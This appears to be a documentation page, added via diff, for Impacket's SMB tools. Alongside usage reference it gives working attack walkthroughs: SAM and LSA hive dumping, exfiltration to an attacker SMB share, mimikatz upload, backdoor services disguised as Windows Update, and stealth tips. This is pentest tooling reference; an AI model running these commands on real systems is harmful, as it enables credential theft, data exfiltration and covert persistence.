@@ -1,0 +1,667 @@
+---
+title: "SMB Operations & File Access"
+description: "Browse shares, access files, and manipulate Windows systems via SMB"
+---
+
+Impacket provides extensive SMB (Server Message Block) functionality for file access, registry operations, and Windows service management.
+
+## File & Share Access
+
+### smbclient.py
+
+Interactive SMB client for browsing shares and transferring files.
+
+<Tabs>
+  <Tab title="Interactive Shell">
+    ```bash
+    # Connect with password
+    smbclient.py DOMAIN/user:password@target
+    
+    # With NTLM hash
+    smbclient.py DOMAIN/user@target -hashes LMHASH:NTHASH
+    
+    # Kerberos authentication
+    smbclient.py DOMAIN/user@target -k -no-pass -dc-ip DC_IP
+    
+    # Anonymous login
+    smbclient.py @target -no-pass
+    ```
+  </Tab>
+  <Tab title="Command File">
+    ```bash
+    # Execute commands from file
+    cat > commands.txt << EOF
+    shares
+    use C$
+    ls
+    cd Windows\System32
+    get win.ini
+    EOF
+    
+    smbclient.py DOMAIN/user:pass@target -inputfile commands.txt
+    ```
+  </Tab>
+  <Tab title="Logging">
+    ```bash
+    # Log all operations to file
+    smbclient.py DOMAIN/user:pass@target -outputfile session.log
+    ```
+  </Tab>
+</Tabs>
+
+### Shell Commands
+
+<AccordionGroup>
+  <Accordion title="Navigation & Listing">
+    ```bash
+    # List available shares
+    shares
+    
+    # Connect to share
+    use SHARENAME
+    use C$
+    use ADMIN$
+    
+    # List files
+    ls
+    dir
+    
+    # Change directory
+    cd Windows\Temp
+    
+    # Show current directory
+    pwd
+    ```
+  </Accordion>
+  <Accordion title="File Operations">
+    ```bash
+    # Download file
+    get filename.txt
+    get C:\Windows\System32\config\SAM
+    
+    # Upload file
+    put /local/path/file.exe
+    put payload.exe C:\Windows\Temp\payload.exe
+    
+    # Create directory
+    mkdir NewFolder
+    
+    # Remove file
+    rm file.txt
+    
+    # Remove directory
+    rmdir FolderName
+    ```
+  </Accordion>
+  <Accordion title="File Information">
+    ```bash
+    # View file info
+    info filename.txt
+    
+    # Read file contents (text files)
+    cat file.txt
+    
+    # View file with pager
+    more file.txt
+    ```
+  </Accordion>
+  <Accordion title="Local Operations">
+    ```bash
+    # Change local directory
+    lcd /tmp
+    
+    # Execute local shell command
+    !ls -la
+    !pwd
+    
+    # Exit
+    exit
+    quit
+    ```
+  </Accordion>
+</AccordionGroup>
+
+### Example Session
+
+```bash
+$ smbclient.py CORP/admin@10.0.0.50 -hashes :8846f7eaee8fb117ad06bdd830b7586c
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+Shared
+
+# use C$
+# ls
+drw-rw-rw-          0  Mon Jan  1 00:00:00 2024 .
+drw-rw-rw-          0  Mon Jan  1 00:00:00 2024 ..
+drw-rw-rw-          0  Wed Dec 20 10:30:22 2023 Program Files
+drw-rw-rw-          0  Wed Dec 20 10:30:22 2023 Windows
+drw-rw-rw-          0  Thu Jan 11 15:45:33 2024 Users
+
+# cd Windows\Temp
+# put payload.exe
+# ls
+-rw-rw-rw-      73802  Thu Jan 15 14:22:11 2024 payload.exe
+
+# exit
+```
+
+### smbserver.py
+
+Create a local SMB server for file transfers and attacks.
+
+<Tabs>
+  <Tab title="Simple Server">
+    ```bash
+    # Share current directory
+    smbserver.py SHARE .
+    
+    # Share specific directory
+    smbserver.py SHARE /path/to/share
+    
+    # From Windows target:
+    # net use \\attacker-ip\SHARE
+    # copy file.txt \\attacker-ip\SHARE\file.txt
+    ```
+  </Tab>
+  <Tab title="Authentication">
+    ```bash
+    # With username/password
+    smbserver.py SHARE /path -username user -password pass
+    
+    # From Windows:
+    # net use \\attacker-ip\SHARE /user:user pass
+    ```
+  </Tab>
+  <Tab title="SMB2 Support">
+    ```bash
+    # Enable SMB2 (required for newer Windows)
+    smbserver.py SHARE /path -smb2support
+    
+    # With authentication
+    smbserver.py SHARE /path -smb2support -username user -password pass
+    ```
+  </Tab>
+  <Tab title="Port Configuration">
+    ```bash
+    # Custom ports (avoid port 445 conflicts)
+    smbserver.py SHARE /path -port 8445
+    
+    # Bind to specific IP
+    smbserver.py SHARE /path -ip 192.168.1.100
+    ```
+  </Tab>
+</Tabs>
+
+### smbserver.py Use Cases
+
+<CodeGroup>
+```bash File Exfiltration
+# On attacker machine:
+smbserver.py LOOT /tmp/loot -smb2support
+
+# On compromised Windows system:
+net use \\10.0.0.100\LOOT
+copy C:\Users\Admin\Documents\*.docx \\10.0.0.100\LOOT\
+reg save HKLM\SAM \\10.0.0.100\LOOT\sam.save
+```
+
+```bash Tool Upload
+# On attacker machine:
+smbserver.py TOOLS /opt/tools -smb2support
+
+# On target:
+net use \\10.0.0.100\TOOLS
+copy \\10.0.0.100\TOOLS\mimikatz.exe C:\Windows\Temp\
+C:\Windows\Temp\mimikatz.exe
+```
+
+```bash Remote Execution
+# Start SMB server with payload
+smbserver.py SHARE . -smb2support
+
+# Execute from target
+psexec.py user:pass@target "\\\\10.0.0.100\\SHARE\\payload.exe"
+
+# Or via wmiexec
+wmiexec.py user:pass@target "\\\\10.0.0.100\\SHARE\\tool.exe -args"
+```
+</CodeGroup>
+
+## Registry Operations
+
+### reg.py
+
+Remote registry access and manipulation.
+
+<Tabs>
+  <Tab title="Query Registry">
+    ```bash
+    # Query registry key
+    reg.py DOMAIN/user:password@target query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion
+    
+    # With hash
+    reg.py DOMAIN/user@target -hashes :NTHASH query -keyName HKLM\\SYSTEM\\CurrentControlSet\\Services
+    ```
+  </Tab>
+  <Tab title="Save Hives">
+    ```bash
+    # Save SAM hive (for credential extraction)
+    reg.py DOMAIN/user:pass@target save -keyName HKLM\\SAM sam.save
+    
+    # Save SYSTEM hive
+    reg.py DOMAIN/user:pass@target save -keyName HKLM\\SYSTEM system.save
+    
+    # Save SECURITY hive
+    reg.py DOMAIN/user:pass@target save -keyName HKLM\\SECURITY security.save
+    
+    # Then use with secretsdump.py:
+    secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+    ```
+  </Tab>
+  <Tab title="Modify Registry">
+    ```bash
+    # Add registry value
+    reg.py DOMAIN/user:pass@target add -keyName HKLM\\SOFTWARE\\TestKey \
+      -v TestValue -vd "Test Data" -vt REG_SZ
+    
+    # Delete registry value
+    reg.py DOMAIN/user:pass@target delete -keyName HKLM\\SOFTWARE\\TestKey -v TestValue
+    
+    # Delete registry key
+    reg.py DOMAIN/user:pass@target delete -keyName HKLM\\SOFTWARE\\TestKey
+    ```
+  </Tab>
+</Tabs>
+
+### registry-read.py
+
+Read registry keys and values remotely.
+
+```bash
+# Read specific key
+registry-read.py DOMAIN/user:password@target -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion
+
+# Enumerate subkeys
+registry-read.py DOMAIN/user:pass@target -keyName HKLM\\SYSTEM\\CurrentControlSet\\Services
+```
+
+### regsecrets.py
+
+Extract secrets from saved registry hives (offline).
+
+```bash
+# Extract from saved hives
+regsecrets.py -sam sam.save -system system.save -security security.save
+
+# Output SAM hashes, LSA secrets, cached credentials
+```
+
+## Service Management
+
+### services.py
+
+Manage Windows services remotely.
+
+<Tabs>
+  <Tab title="List Services">
+    ```bash
+    # List all services
+    services.py DOMAIN/user:password@target list
+    
+    # Filter by status
+    services.py DOMAIN/user:pass@target list | grep -i running
+    ```
+  </Tab>
+  <Tab title="Service Control">
+    ```bash
+    # Start service
+    services.py DOMAIN/user:pass@target start -name ServiceName
+    
+    # Stop service
+    services.py DOMAIN/user:pass@target stop -name ServiceName
+    
+    # Restart service
+    services.py DOMAIN/user:pass@target stop -name ServiceName
+    services.py DOMAIN/user:pass@target start -name ServiceName
+    
+    # Delete service
+    services.py DOMAIN/user:pass@target delete -name ServiceName
+    ```
+  </Tab>
+  <Tab title="Create Service">
+    ```bash
+    # Create new service
+    services.py DOMAIN/user:pass@target create -name BackdoorSvc \
+      -display "Windows Backup Service" -path "C:\\Windows\\Temp\\payload.exe"
+    
+    # Start created service
+    services.py DOMAIN/user:pass@target start -name BackdoorSvc
+    ```
+  </Tab>
+  <Tab title="Service Info">
+    ```bash
+    # Query service configuration
+    services.py DOMAIN/user:pass@target status -name ServiceName
+    
+    # Get service details
+    services.py DOMAIN/user:pass@target config -name ServiceName
+    ```
+  </Tab>
+</Tabs>
+
+### Example Service Manipulation
+
+```bash
+# 1. List services to find target
+services.py CORP/admin:pass@target list
+
+# 2. Stop service
+services.py CORP/admin:pass@target stop -name VulnService
+
+# 3. Upload malicious binary
+smbclient.py CORP/admin:pass@target
+# use C$
+# put payload.exe Windows\System32\VulnService.exe
+
+# 4. Restart service
+services.py CORP/admin:pass@target start -name VulnService
+```
+
+## Specialized SMB Tools
+
+### smbmap
+
+While not part of Impacket, it's worth mentioning for enumeration:
+
+```bash
+# List shares (external tool - for reference)
+smbmap -H target -u user -p password
+smbmap -H target -u user -H HASH
+```
+
+### attrib.py
+
+Manage file attributes via SMB.
+
+```bash
+# Get file attributes
+attrib.py DOMAIN/user:password@target -file "C:\\path\\to\\file.txt"
+
+# Set attributes
+attrib.py DOMAIN/user:pass@target -file "C:\\file.txt" -attr +h +s +r
+# +h = hidden, +s = system, +r = readonly
+```
+
+### ntfs-read.py
+
+Direct NTFS filesystem access (requires raw disk access).
+
+```bash
+# Read NTFS volume
+ntfs-read.py DOMAIN/user:password@target -volume C:
+
+# Extract specific file
+ntfs-read.py DOMAIN/user:pass@target -volume C: -file "\\Windows\\System32\\config\\SAM"
+```
+
+## Attack Scenarios
+
+<Tabs>
+  <Tab title="Credential Harvesting">
+    ```bash
+    # 1. Save registry hives
+    reg.py CORP/admin:pass@target save -keyName HKLM\\SAM sam.save
+    reg.py CORP/admin:pass@target save -keyName HKLM\\SYSTEM system.save
+    reg.py CORP/admin:pass@target save -keyName HKLM\\SECURITY security.save
+    
+    # 2. Download hives
+    smbclient.py CORP/admin:pass@target
+    # use C$
+    # cd Windows\Temp
+    # get sam.save
+    # get system.save
+    # get security.save
+    
+    # 3. Extract credentials offline
+    secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+    
+    # 4. Clean up
+    smbclient.py CORP/admin:pass@target
+    # use C$
+    # cd Windows\Temp
+    # rm sam.save
+    # rm system.save
+    # rm security.save
+    ```
+  </Tab>
+  <Tab title="File Exfiltration">
+    ```bash
+    # 1. Start SMB server
+    smbserver.py EXFIL /tmp/stolen -smb2support
+    
+    # 2. Connect from target and copy files
+    # Via wmiexec/psexec:
+    wmiexec.py CORP/user:pass@target
+    > net use \\\\10.0.0.100\\EXFIL
+    > xcopy C:\\Users\\Admin\\Documents \\\\10.0.0.100\\EXFIL\\ /E /H /C /I
+    
+    # 3. Or use robocopy for better file copying
+    > robocopy C:\\Sensitive \\\\10.0.0.100\\EXFIL\\ /E /ZB /COPY:DAT
+    
+    # 4. Disconnect
+    > net use \\\\10.0.0.100\\EXFIL /delete
+    ```
+  </Tab>
+  <Tab title="Persistence via Service">
+    ```bash
+    # 1. Upload payload to target
+    smbclient.py CORP/admin:pass@target
+    # use C$
+    # put backdoor.exe Windows\System32\WindowsUpdate.exe
+    
+    # 2. Create service
+    services.py CORP/admin:pass@target create -name WinUpdate \
+      -display "Windows Update Service" \
+      -path "C:\\Windows\\System32\\WindowsUpdate.exe"
+    
+    # 3. Configure auto-start
+    reg.py CORP/admin:pass@target add \
+      -keyName HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinUpdate \
+      -v Start -vt REG_DWORD -vd 2
+    
+    # 4. Start service
+    services.py CORP/admin:pass@target start -name WinUpdate
+    ```
+  </Tab>
+  <Tab title="Share Enumeration">
+    ```bash
+    # 1. List shares
+    smbclient.py @target -no-pass
+    > shares
+    
+    # 2. Check each share for sensitive files
+    > use NETLOGON
+    > ls
+    > use SYSVOL
+    > ls
+    > use Shared
+    > ls
+    
+    # 3. Search for specific files
+    > use C$
+    > cd Users
+    > ls /recursive | grep -i password
+    > ls /recursive | grep -i .config
+    
+    # 4. Download interesting files
+    > get interesting_file.txt
+    ```
+  </Tab>
+</Tabs>
+
+## Network Utilities
+
+### sniffer.py / sniff.py
+
+Capture network traffic (requires raw socket access).
+
+```bash
+# Sniff network traffic
+sniffer.py -i eth0
+
+# Filter specific protocols
+sniff.py -i eth0 -filter "tcp port 445"
+```
+
+### ping.py / ping6.py
+
+ICMP ping implementations.
+
+```bash
+# IPv4 ping
+ping.py target
+
+# IPv6 ping
+ping6.py target-ipv6
+```
+
+### getArch.py
+
+Detect target system architecture.
+
+```bash
+# Detect if target is 32-bit or 64-bit
+getArch.py DOMAIN/user:password@target
+
+# Useful before uploading payloads
+getArch.py CORP/admin:pass@10.0.0.50
+```
+
+### machine_role.py
+
+Determine machine role (workstation, server, DC).
+
+```bash
+# Identify machine role
+machine_role.py DOMAIN/user:password@target
+
+# Output: Workstation, Server, or Domain Controller
+```
+
+## Common Issues & Solutions
+
+<AccordionGroup>
+  <Accordion title="Access Denied">
+    ```bash
+    # Verify credentials work
+    crackmapexec smb target -u user -p password
+    
+    # Check share permissions
+    smbmap -H target -u user -p password
+    
+    # Try different shares
+    smbclient.py user:pass@target
+    > shares
+    > use ADMIN$  # Requires admin
+    > use C$      # Requires admin
+    > use IPC$    # Usually accessible
+    ```
+  </Accordion>
+  <Accordion title="SMB Version Issues">
+    ```bash
+    # SMBv1 disabled (Windows 10+/Server 2016+)
+    # Ensure tools use SMB2/3:
+    smbserver.py SHARE /path -smb2support
+    
+    # Check SMB version with nmap
+    nmap -p445 --script smb-protocols target
+    
+    # Force SMB2
+    smbclient.py user:pass@target -smb2
+    ```
+  </Accordion>
+  <Accordion title="Registry Access Denied">
+    ```bash
+    # Ensure RemoteRegistry service is running
+    services.py domain/user:pass@target start -name RemoteRegistry
+    
+    # Verify admin privileges
+    crackmapexec smb target -u user -p pass --local-auth
+    
+    # Use alternative methods
+    secretsdump.py domain/user:pass@target -use-vss
+    ```
+  </Accordion>
+  <Accordion title="File Transfer Failures">
+    ```bash
+    # Check available disk space
+    smbclient.py user:pass@target
+    > use C$
+    > ls
+    
+    # Try different share
+    > use D$
+    
+    # Use smaller chunks (for large files)
+    # Split file first:
+    split -b 10M largefile.bin chunk_
+    
+    # Upload chunks
+    > put chunk_aa
+    > put chunk_ab
+    
+    # Reassemble on target
+    > !cmd /c copy /b chunk_* largefile.bin
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Stealth" icon="user-secret">
+    - Avoid multiple failed auth attempts
+    - Use legitimate-looking service names
+    - Clean up uploaded files after use
+    - Restore original registry values
+  </Card>
+  <Card title="Reliability" icon="check">
+    - Verify file transfers completed
+    - Test commands before automation
+    - Handle errors gracefully
+    - Keep logs for troubleshooting
+  </Card>
+  <Card title="Security" icon="shield">
+    - Use Kerberos when possible
+    - Encrypt sensitive file transfers
+    - Securely delete extracted data
+    - Don't leave backdoors accessible
+  </Card>
+  <Card title="Documentation" icon="book">
+    - Record all modifications made
+    - Document created services/files
+    - Note original configurations
+    - Maintain cleanup checklist
+  </Card>
+</CardGroup>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Remote Execution" icon="terminal" href="/examples/remote-execution">
+    Execute commands after accessing shares
+  </Card>
+  <Card title="Credential Dumping" icon="key" href="/examples/credential-dumping">
+    Extract credentials via registry access
+  </Card>
+  <Card title="LDAP Operations" icon="sitemap" href="/examples/ldap-operations">
+    Enumerate Active Directory objects
+  </Card>
+</CardGroup>
